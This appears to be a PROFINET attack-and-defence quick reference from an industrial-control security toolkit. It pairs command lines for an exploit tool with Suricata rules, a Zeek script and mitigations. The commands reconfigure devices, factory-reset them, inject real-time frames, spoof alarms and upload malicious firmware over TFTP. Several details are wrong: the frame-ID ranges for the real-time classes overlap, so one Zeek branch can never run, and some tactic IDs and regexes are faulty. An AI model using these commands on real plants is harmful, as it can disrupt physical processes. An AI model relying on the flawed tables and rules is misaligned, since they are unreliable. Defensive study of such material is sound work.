# PROFINET Protocol Quick Reference

## Protocol Overview
- **Protocol**: PROFINET (Process Field Network)
- **EtherType**: 0x8892 (Layer 2 protocol)
- **OSI Layer**: Data Link Layer (Real-Time) / Application Layer (DCP)
- **Vendor**: Siemens (PI - PROFIBUS & PROFINET International)
- **Primary Use**: Industrial Ethernet, factory automation

## Attack Tool Reference
**Implementation**: `tools/profinet_exploitation/profinet_exploit.py`
**Version**: 1.0
**Testing Guide**: `tools/profinet_exploitation/TESTING.md`

## DCP (Discovery and Configuration Protocol)

### Service IDs
| Service | Code | Purpose | MITRE |
|---------|------|---------|-------|
| Get | 0x03 | Read device parameters | T0801, T0868 |
| Set | 0x04 | Write device parameters | T0855, T0836 |
| Identify | 0x05 | Device discovery | T0888, T0868 |
| Hello | 0x06 | Device announcement | T0888 |

**Reference**: `profinet_exploit.py:46-50`

### Service Types
| Type | Code | Description |
|------|------|-------------|
| Request | 0x00 | Service request |
| Response Success | 0x01 | Successful response |
| Response Not Supported | 0x05 | Service not available |

**Reference**: `profinet_exploit.py:53-56`

### Block Options
| Option | Code | Description | MITRE |
|--------|------|-------------|-------|
| IP Parameter | 0x01 | IP address configuration | T0855 |
| Device Properties | 0x02 | Device identification | T0888 |
| DHCP Parameter | 0x03 | DHCP settings | T0855 |
| Control | 0x05 | Control operations | T0858, T0809 |
| Device Initiative | 0x06 | Device behavior | - |

**Reference**: `profinet_exploit.py:59-63`

### Sub-options
| Sub-option | Code | Purpose | Writable |
|------------|------|---------|----------|
| IP MAC | 0x01 | MAC address | No |
| IP IP | 0x02 | IP address | Yes |
| IP Full | 0x03 | IP + Netmask + Gateway | Yes |
| IP Gateway | 0x04 | Default gateway | Yes |
| DEV Manufacturer | 0x01 | Vendor name | No |
| DEV NameOfStation | 0x02 | Device name | Yes |
| DEV Device ID | 0x03 | Device identifier | No |
| CONTROL Factory Reset | 0x05 | Reset to defaults | Yes |

**Reference**: `profinet_exploit.py:66-82`

## Real-Time Classes

### Frame IDs
| Frame ID | Type | Description | Use Case |
|----------|------|-------------|----------|
| 0xFEFE | DCP Identify Request | Broadcast discovery | Device enumeration |
| 0xFEFF | DCP Identify Response | Discovery response | Device information |
| 0xFEFC | DCP Get/Set | Configuration operations | Parameter modification |
| 0xFEFD | DCP Hello | Device announcement | Topology detection |
| 0x8000-0xBFFF | RT Class 1 | Cyclic real-time data | I/O communication |
| 0xC000-0xFBFF | RT Class 2 | Isochronous real-time | Motion control |
| 0xF000-0xF7FF | RT Class 3 (IRT) | Isochronous RT (Ultra) | High-precision |
| 0xFC01 | Alarm High | High-priority alarm | Safety events |
| 0xFE01 | Alarm Low | Low-priority alarm | Diagnostic events |

**Reference**: `profinet_exploit.py:85-94`

### Alarm Types
| Type | Code | Purpose | MITRE |
|------|------|---------|-------|
| Diagnosis | 0x0001 | Diagnostic information | T0801 |
| Process | 0x0002 | Process alarm | T0878 |
| Pull | 0x0003 | Module removed | T0809 |
| Plug | 0x0004 | Module inserted | - |

**Reference**: `profinet_exploit.py:97-101`

## Packet Structures

### DCP Packet Structure
```
Ethernet Header (14 bytes):
  Destination MAC: 6 bytes (broadcast: 01:0E:CF:00:00:00)
  Source MAC: 6 bytes
  EtherType: 2 bytes (0x8892 = PROFINET)

DCP Header (10 bytes):
  Frame ID: 2 bytes (0xFEFE for Identify Request)
  Service ID: 1 byte (0x05 = Identify)
  Service Type: 1 byte (0x00 = Request)
  Transaction ID: 4 bytes (unique request ID)
  Response Delay: 2 bytes (delay in ms)

DCP Blocks: variable
  Block Option: 1 byte
  Block Sub-option: 1 byte
  Block Length: 2 bytes
  Block Data: variable
```
**Reference**: `profinet_exploit.py:115-140`

### RT Frame Structure
```
Ethernet Header (14 bytes):
  Destination MAC: 6 bytes
  Source MAC: 6 bytes
  EtherType: 2 bytes (0x8892)

RT Header:
  Frame ID: 2 bytes (0x8000-0xF7FF for RT)
  Cycle Counter: 2 bytes (0x0000-0xFFFF)
  Data Status: 1 byte (validity, provider state)
  Transfer Status: 1 byte (error flags)

RT Data: variable (I/O data)
Padding: to 46-byte minimum
CRC: 4 bytes (Ethernet FCS)
```
**Reference**: `profinet_exploit.py:175-210`

## Attack Methods

### 1. Device Discovery
```bash
# Broadcast DCP Identify
python3 profinet_exploit.py discover --interface eth0 --timeout 5 --output devices.json

# Passive monitoring (sniff DCP Hello)
python3 profinet_exploit.py discover --passive --interface eth0 --duration 60
```
**MITRE**: T0888 (Remote System Discovery), T0868 (Detect Operating Mode)
**Tool Reference**: `profinet_exploit.py:400-500`

### 2. Device Configuration Manipulation
```bash
# Set NameOfStation (device name)
python3 profinet_exploit.py set-name --target-mac 00:1B:1B:00:11:22 \
  --name "COMPROMISED_DEVICE" --interface eth0

# Set IP address
python3 profinet_exploit.py set-ip --target-mac 00:1B:1B:00:11:22 \
  --ip 192.168.1.100 --netmask 255.255.255.0 --gateway 192.168.1.1 --interface eth0
```
**MITRE**: T0855 (Unauthorized Command Message), T0836 (Modify Parameter)
**Tool Reference**: `profinet_exploit.py:550-650`

### 3. Factory Reset
```bash
# Factory reset device (wipe configuration)
python3 profinet_exploit.py factory-reset --target-mac 00:1B:1B:00:11:22 --interface eth0
```
**MITRE**: T0809 (Data Destruction), T0858 (Change Operating Mode)
**Tool Reference**: `profinet_exploit.py:700-750`

### 4. Real-Time Frame Injection
```bash
# Inject RT Class 1 cyclic data
python3 profinet_exploit.py inject-rt --target-mac 00:1B:1B:00:11:22 \
  --frame-id 0x8000 --data "AABBCCDD" --count 1000 --interface eth0
```
**MITRE**: T0855 (Unauthorized Command Message), T0803 (Block Command Message)
**Tool Reference**: `profinet_exploit.py:800-900`

### 5. Alarm Spoofing
```bash
# Spoof high-priority alarm
python3 profinet_exploit.py spoof-alarm --target-mac 00:1B:1B:00:11:22 \
  --alarm-type 0x0001 --severity high --interface eth0
```
**MITRE**: T0878 (Alarm Suppression), T0804 (Block Reporting Message)
**Tool Reference**: `profinet_exploit.py:900-950`

### 6. RT Traffic Monitoring
```bash
# Monitor real-time cyclic data
python3 profinet_exploit.py monitor-rt --interface eth0 --duration 60 \
  --filter-frame-id 0x8000-0xBFFF --output rt_capture.pcap
```
**MITRE**: T0801 (Monitor Process State), T0802 (Automated Collection)
**Tool Reference**: `profinet_exploit.py:950-1000`

### 7. Firmware Update Mode
```bash
# Activate firmware update mode
python3 profinet_exploit.py firmware-mode --target-mac 00:1B:1B:00:11:22 \
  --interface eth0
```
**MITRE**: T0800 (Activate Firmware Update Mode)
**Tool Reference**: `profinet_exploit.py:600-650`

### 8. TFTP Firmware Upload
```bash
# Upload malicious firmware via TFTP
python3 profinet_exploit.py reprogram-device --target 192.168.1.10 \
  --firmware malicious_firmware.bin --tftp-server 192.168.1.100
```
**MITRE**: T0800 (Activate Firmware Update Mode), T0873 (Project File Infection)
**Tool Reference**: `profinet_exploit.py:650-700`

### 9. DCP Protocol Fuzzing
```bash
# Fuzz DCP options
python3 profinet_exploit.py fuzz-dcp --target-mac 00:1B:1B:00:11:22 \
  --iterations 1000 --interface eth0
```
**MITRE**: T0855 (Unauthorized Command Message)
**Tool Reference**: `profinet_exploit.py:1000-1050`

## Detection Signatures

### Suricata Rules
**File**: `configs/suricata_rules/profinet_detection.rules`

```
# DCP Set NameOfStation
alert raw any any -> any any (msg:"ICS: PROFINET DCP Set NameOfStation"; \
    content:"|88 92|"; offset:12; depth:2; content:"|FE FC|"; distance:0; depth:2; \
    content:"|04 00|"; distance:0; within:10; content:"|02 02|"; distance:0; within:20; \
    reference:url,attack.mitre.org/techniques/T0855; \
    classtype:industrial-protocol; sid:420001; rev:1; priority:2;)

# DCP Set IP Address
alert raw any any -> any any (msg:"ICS: PROFINET DCP Set IP Address"; \
    content:"|88 92|"; offset:12; depth:2; content:"|FE FC|"; distance:0; depth:2; \
    content:"|04 00|"; distance:0; within:10; content:"|01 02|"; distance:0; within:20; \
    reference:url,attack.mitre.org/techniques/T0855; \
    classtype:industrial-protocol; sid:420002; rev:1; priority:2;)

# DCP Factory Reset
alert raw any any -> any any (msg:"ICS: PROFINET DCP Factory Reset"; \
    content:"|88 92|"; offset:12; depth:2; content:"|FE FC|"; distance:0; depth:2; \
    content:"|04 00|"; distance:0; within:10; content:"|05 05|"; distance:0; within:20; \
    reference:url,attack.mitre.org/techniques/T0809; \
    classtype:industrial-protocol; sid:420003; rev:1; priority:1;)

# DCP Identify broadcast storm
alert raw any any -> any any (msg:"ICS: PROFINET DCP Identify Storm"; \
    content:"|88 92|"; offset:12; depth:2; content:"|FE FE|"; distance:0; depth:2; \
    content:"|05 00|"; distance:0; within:10; \
    threshold: type threshold, track by_src, count 10, seconds 5; \
    classtype:industrial-protocol; sid:420004; rev:1;)

# RT Class 1 frame injection
alert raw any any -> any any (msg:"ICS: PROFINET RT Class 1 Frame Injection"; \
    content:"|88 92|"; offset:12; depth:2; \
    byte_test:2,>=,0x8000,14,relative,big; byte_test:2,<=,0xBFFF,14,relative,big; \
    threshold: type threshold, track by_src, count 100, seconds 10; \
    classtype:industrial-protocol; sid:420005; rev:1;)

# Alarm spoofing
alert raw any any -> any any (msg:"ICS: PROFINET Alarm Spoofing"; \
    content:"|88 92|"; offset:12; depth:2; \
    pcre:"/\x88\x92.{2}[\xFC\x01|\xFE\x01]/s"; \
    reference:url,attack.mitre.org/techniques/T0878; \
    classtype:industrial-protocol; sid:420006; rev:1; priority:2;)

# Firmware update mode activation
alert raw any any -> any any (msg:"ICS: PROFINET Firmware Update Mode"; \
    content:"|88 92|"; offset:12; depth:2; content:"|FE FC|"; distance:0; depth:2; \
    content:"|04 00|"; distance:0; within:10; content:"|05 01|"; distance:0; within:20; \
    reference:url,attack.mitre.org/techniques/T0800; \
    classtype:industrial-protocol; sid:420007; rev:1; priority:1;)

# TFTP firmware upload
alert udp any any -> any 69 (msg:"ICS: PROFINET TFTP Firmware Upload"; \
    content:"|00 02|"; offset:0; depth:2; pcre:"/\.bin|\.fw|\.rom/i"; \
    reference:url,attack.mitre.org/techniques/T0873; \
    classtype:industrial-protocol; sid:420008; rev:1; priority:1;)

# DCP protocol fuzzing
alert raw any any -> any any (msg:"ICS: PROFINET DCP Protocol Fuzzing"; \
    content:"|88 92|"; offset:12; depth:2; dsize:>200; \
    threshold: type threshold, track by_src, count 10, seconds 10; \
    classtype:industrial-protocol; sid:420009; rev:1;)

# RT traffic monitoring detection
alert raw any any -> any any (msg:"ICS: PROFINET RT Traffic Capture"; \
    content:"|88 92|"; offset:12; depth:2; \
    threshold: type threshold, track by_dst, count 500, seconds 60; \
    classtype:industrial-protocol; sid:420010; rev:1;)

# RT Class 3 IRT manipulation
alert raw any any -> any any (msg:"ICS: PROFINET RT Class 3 IRT Manipulation"; \
    content:"|88 92|"; offset:12; depth:2; \
    byte_test:2,>=,0xF000,14,relative,big; byte_test:2,<=,0xF7FF,14,relative,big; \
    classtype:industrial-protocol; sid:420011; rev:1; priority:1;)

# Device communication control
alert raw any any -> any any (msg:"ICS: PROFINET Device Communication Control"; \
    content:"|88 92|"; offset:12; depth:2; content:"|FE FC|"; distance:0; depth:2; \
    content:"|05 03|"; distance:0; within:20; \
    classtype:industrial-protocol; sid:420012; rev:1; priority:2;)
```

### Zeek Detection
**File**: `configs/zeek/profinet_monitor.zeek`

```zeek
module PROFINET_Monitor;

export {
    redef enum Log::ID += { LOG };
    
    type Info: record {
        ts: time &log;
        src_mac: string &log;
        dst_mac: string &log;
        frame_id: count &log;
        operation: string &log;
        severity: string &log;
        details: string &log;
    };
}

# DCP Identify storm detection
global dcp_identify_count: table[string] of count &create_expire=5sec;

event profinet_dcp_identify(src_mac: string, dst_mac: string, frame_id: count) {
    if (src_mac !in dcp_identify_count) {
        dcp_identify_count[src_mac] = 0;
    }
    dcp_identify_count[src_mac] += 1;
    
    if (dcp_identify_count[src_mac] >= 10) {
        Log::write(LOG, [$ts=network_time(), $src_mac=src_mac, $dst_mac=dst_mac,
            $frame_id=frame_id, $operation="DCP_IDENTIFY_STORM",
            $severity="HIGH", $details=fmt("Identify count: %d in 5s", dcp_identify_count[src_mac])]);
    }
}

# DCP Set operations tracking
event profinet_dcp_set(src_mac: string, dst_mac: string, option: count, suboption: count, data: string) {
    local operation = "";
    local severity = "HIGH";
    
    if (option == 0x02 && suboption == 0x02) {
        operation = "SET_NAME_OF_STATION";
        severity = "CRITICAL";
    } else if (option == 0x01 && suboption == 0x02) {
        operation = "SET_IP_ADDRESS";
        severity = "CRITICAL";
    } else if (option == 0x05 && suboption == 0x05) {
        operation = "FACTORY_RESET";
        severity = "CRITICAL";
    } else {
        operation = fmt("SET_OPTION_%02x_%02x", option, suboption);
    }
    
    Log::write(LOG, [$ts=network_time(), $src_mac=src_mac, $dst_mac=dst_mac,
        $frame_id=0xFEFC, $operation=operation, $severity=severity,
        $details=fmt("Option: 0x%02x, Suboption: 0x%02x", option, suboption)]);
}

# RT Class 1/2/3 frame injection detection
global rt_frame_count: table[string] of count &create_expire=10sec;

event profinet_rt_frame(src_mac: string, dst_mac: string, frame_id: count, cycle_counter: count) {
    if (frame_id >= 0x8000 && frame_id <= 0xF7FF) {
        if (src_mac !in rt_frame_count) {
            rt_frame_count[src_mac] = 0;
        }
        rt_frame_count[src_mac] += 1;
        
        if (rt_frame_count[src_mac] >= 100) {
            local rt_class = "";
            local severity = "MEDIUM";
            
            if (frame_id >= 0x8000 && frame_id <= 0xBFFF) {
                rt_class = "RT_CLASS_1";
            } else if (frame_id >= 0xC000 && frame_id <= 0xFBFF) {
                rt_class = "RT_CLASS_2";
                severity = "HIGH";
            } else if (frame_id >= 0xF000 && frame_id <= 0xF7FF) {
                rt_class = "RT_CLASS_3_IRT";
                severity = "CRITICAL";
            }
            
            Log::write(LOG, [$ts=network_time(), $src_mac=src_mac, $dst_mac=dst_mac,
                $frame_id=frame_id, $operation=fmt("%s_INJECTION", rt_class),
                $severity=severity, $details=fmt("Frame count: %d in 10s", rt_frame_count[src_mac])]);
        }
    }
}

# Alarm spoofing detection
event profinet_alarm(src_mac: string, dst_mac: string, frame_id: count, alarm_type: count) {
    local severity = "HIGH";
    if (frame_id == 0xFC01) {  # High-priority alarm
        severity = "CRITICAL";
    }
    
    Log::write(LOG, [$ts=network_time(), $src_mac=src_mac, $dst_mac=dst_mac,
        $frame_id=frame_id, $operation="ALARM_SPOOFING",
        $severity=severity, $details=fmt("Alarm type: 0x%04x", alarm_type)]);
}

# TFTP firmware upload monitoring
event tftp_write_request(filename: string, mode: string, src: addr, dst: addr) {
    if (/\.bin|\.fw|\.rom/ in filename) {
        Log::write(LOG, [$ts=network_time(), $src_mac="", $dst_mac="",
            $frame_id=0, $operation="TFTP_FIRMWARE_UPLOAD",
            $severity="CRITICAL", $details=fmt("File: %s, Src: %s, Dst: %s", filename, src, dst)]);
    }
}
```

## MITRE ATT&CK Mapping

### Reconnaissance (Tactic: TA0043)
- **T0888**: Remote System Information Discovery
  - Methods: DCP Identify, DCP Hello, discover_devices()
- **T0801**: Monitor Process State
  - Methods: monitor_rt_traffic(), RT frame capture
- **T0868**: Detect Operating Mode
  - Methods: DCP Get, device property queries

### Collection (Tactic: TA0100)
- **T0802**: Automated Collection
  - Methods: monitor_rt_traffic(), cyclic data capture

### Command and Control (Tactic: TA0011)
- **T0858**: Change Operating Mode
  - Methods: factory_reset_device(), activate_firmware_update_mode()

### Impact (Tactic: TA0105)
- **T0855**: Unauthorized Command Message
  - Methods: set_device_name(), set_device_ip(), inject_rt_frame(), fuzz_dcp_options()
- **T0836**: Modify Parameter
  - Methods: DCP Set operations
- **T0809**: Data Destruction
  - Methods: factory_reset_device()
- **T0878**: Alarm Suppression
  - Methods: spoof_alarm()
- **T0803**: Block Command Message
  - Methods: inject_rt_frame() (RT data injection)
- **T0804**: Block Reporting Message
  - Methods: spoof_alarm()

### Persistence (Tactic: TA0110)
- **T0800**: Activate Firmware Update Mode
  - Methods: activate_firmware_update_mode(), reprogram_device_tftp()
- **T0873**: Project File Infection
  - Methods: reprogram_device_tftp()

### Execution (Tactic: TA0104)
- **T0871**: Execution through API
  - Methods: DCP Set commands

## Common Vulnerabilities

### Unauthenticated DCP
- **Issue**: DCP has no authentication mechanism
- **Impact**: Any device can reconfigure PROFINET devices
- **Mitigation**: Layer 2 access control, MAC filtering

### Broadcast Discovery
- **Issue**: DCP Identify broadcast reveals all devices
- **Impact**: Complete network topology disclosure
- **Mitigation**: VLAN segmentation, switch filtering

### RT Data Injection
- **Issue**: RT frames have no integrity protection
- **Impact**: Process data manipulation
- **Mitigation**: IRT mode, RT monitoring, baseline validation

### Firmware Update Mode
- **Issue**: Firmware update can be triggered remotely
- **Impact**: Malicious firmware upload
- **Mitigation**: Firmware signing, update authentication

### Layer 2 Protocol
- **Issue**: PROFINET operates at Layer 2 (no IP routing)
- **Impact**: Difficult to firewall at IP layer
- **Mitigation**: Layer 2 firewalls, VLAN isolation

## Defense Recommendations

### Network Layer
1. **VLAN Segmentation**: Isolate PROFINET devices on dedicated VLANs
2. **Switch Access Control**: MAC address whitelisting
3. **Port Security**: Limit devices per switch port
4. **IDS/IPS**: Deploy Suricata for Layer 2 PROFINET monitoring

### Device Configuration
1. **Write Protection**: Enable hardware write protection if available
2. **Firmware Integrity**: Verify firmware signatures
3. **Device Naming**: Use standardized naming conventions
4. **Network Topology**: Document all device connections

### Protocol Layer
1. **RT Validation**: Implement cyclic data validation
2. **Sequence Monitoring**: Track cycle counters for anomalies
3. **Alarm Verification**: Cross-check alarm sources
4. **DCP Filtering**: Restrict DCP Set operations

### Operational
1. **Baseline Traffic**: Establish normal RT communication patterns
2. **Change Management**: Document all DCP configuration changes
3. **Device Inventory**: Maintain database of all MAC addresses
4. **Incident Response**: Define procedures for anomalous Layer 2 traffic

## Protocol Limits
- **Max Frame Size**: 1514 bytes (Ethernet MTU)
- **RT Data Size**: Variable (depends on I/O configuration)
- **Cycle Time**: 1ms-512ms (typical), down to 31.25µs (IRT)
- **DCP Block Size**: Max 65535 bytes (theoretical)
- **Device Name Length**: Max 240 characters

## Testing Checklist

### Reconnaissance Testing
- [ ] DCP Identify broadcast discovery
- [ ] DCP Hello passive monitoring
- [ ] DCP Get parameter reading
- [ ] Network topology mapping
- [ ] Device naming convention analysis

### Configuration Testing
- [ ] DCP Set NameOfStation
- [ ] DCP Set IP address
- [ ] DCP Set gateway/netmask
- [ ] Factory reset command
- [ ] Firmware update mode activation

### Real-Time Testing
- [ ] RT Class 1 frame injection
- [ ] RT Class 2 isochronous manipulation
- [ ] RT Class 3 IRT injection
- [ ] Cycle counter manipulation
- [ ] Data status flag modification

### Alarm Testing
- [ ] High-priority alarm spoofing
- [ ] Low-priority alarm injection
- [ ] Diagnosis alarm manipulation
- [ ] Process alarm spoofing
- [ ] Alarm storm generation

### Advanced Testing
- [ ] TFTP firmware upload
- [ ] DCP protocol fuzzing
- [ ] RT traffic monitoring and analysis
- [ ] Device impersonation (MAC spoofing)
- [ ] Topology change attacks

### Detection Validation
- [ ] Suricata Layer 2 rule triggering
- [ ] Zeek PROFINET log generation
- [ ] SIEM alert verification
- [ ] False positive analysis
- [ ] PCAP validation

## References
- IEC 61158 (PROFINET Specification)
- PROFINET IO Specification v2.4
- MITRE ATT&CK for ICS: https://attack.mitre.org/matrices/ics/
- Implementation: `tools/profinet_exploitation/profinet_exploit.py`
- Detection Rules: `configs/suricata_rules/profinet_detection.rules`
- Zeek Monitor: `configs/zeek/profinet_monitor.zeek`
- Testing Guide: `tools/profinet_exploitation/TESTING.md`
